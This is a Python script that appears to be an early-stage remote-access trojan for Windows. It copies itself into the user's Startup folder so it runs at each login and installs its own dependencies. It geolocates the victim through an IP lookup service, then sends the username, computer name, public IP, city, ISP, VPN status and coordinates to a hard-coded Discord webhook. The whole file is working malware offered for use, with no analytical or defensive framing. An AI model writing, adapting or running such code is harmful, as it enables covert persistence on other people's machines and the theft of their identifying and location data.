import sys
import subprocess

required_packages = {
    "pyautogui": "pyautogui",
    "requests": "requests",
}

for module_name, package_name in required_packages.items():
    try:
        __import__(module_name)
    except ImportError:
        print(f"{module_name} missing. Installing...")
        subprocess.check_call([
            sys.executable,
            "-m",
            "pip",
            "install",
            package_name
        ])

# Imports after dependency check
import time
import traceback
import os
import shutil
import socket
import pyautogui
import requests
import getpass
from pathlib import Path

source = Path(__file__).resolve()

# Check if the script is already in the startup folder

startup = (
    Path(os.environ["APPDATA"])
    / "Microsoft"
    / "Windows"
    / "Start Menu"
    / "Programs"
    / "Startup"
)

destination = startup / source.name

if not destination.exists() or source.read_bytes() != destination.read_bytes():
    shutil.copy2(source, destination)
    print("762")
else:
    sys.exit()

# actual ratting code here

webhook_url = "https://discord.com/api/webhooks/1554280938639335487/AXPCTojbcPiFpj3HRSEoqJ4tjKp_DgoDDaoTtETfSOCgr6GVw1YtixIDPzp6iN0WAPfe"

geo = requests.get(
    "http://ip-api.com/json/",
    params={
        "fields": (
            "status,message,query,country,countryCode,regionName,"
            "city,zip,lat,lon,timezone,isp,org,mobile,proxy,hosting"
        )
    },
    timeout=10
).json()

if geo.get("status") != "success":
    print("IP lookup failed:", geo.get("message"))
    raise SystemExit

data = {
    "embeds": [
        {
            "title": "Host Info",
            "fields": [
                {
                    "name": "Username",
                    "value": getpass.getuser(),
                    "inline": True
                },
                {
                    "name": "Computer Name",
                    "value": socket.gethostname(),
                    "inline": True
                },
                {
                    "name": "Public IP",
                    "value": str(geo.get("query")),
                    "inline": True
                },
                {
                    "name": "Country",
                    "value": f"{geo.get('country')} ({geo.get('countryCode')})",
                    "inline": True
                },
                {
                    "name": "Region",
                    "value": str(geo.get("regionName")),
                    "inline": True
                },
                {
                    "name": "City",
                    "value": str(geo.get("city")),
                    "inline": True
                },
                {
                    "name": "ZIP",
                    "value": str(geo.get("zip")),
                    "inline": True
                },
                {
                    "name": "Timezone",
                    "value": str(geo.get("timezone")),
                    "inline": True
                },
                {
                    "name": "ISP",
                    "value": str(geo.get("isp")),
                    "inline": True
                },
                {
                    "name": "Organization",
                    "value": str(geo.get("org")),
                    "inline": True
                },
                {
                    "name": "Mobile",
                    "value": str(geo.get("mobile")),
                    "inline": True
                },
                {
                    "name": "Proxy / VPN / Tor",
                    "value": str(geo.get("proxy")),
                    "inline": True
                },
                {
                    "name": "Hosting / Datacenter",
                    "value": str(geo.get("hosting")),
                    "inline": True
                },
                {
                    "name": "Approx. Coordinates",
                    "value": f"{geo.get('lat')}, {geo.get('lon')}",
                    "inline": False
                }
            ]
        }
    ]
}

response = requests.post(
    webhook_url,
    json=data,
    timeout=10
)

print("Status code:", response.status_code)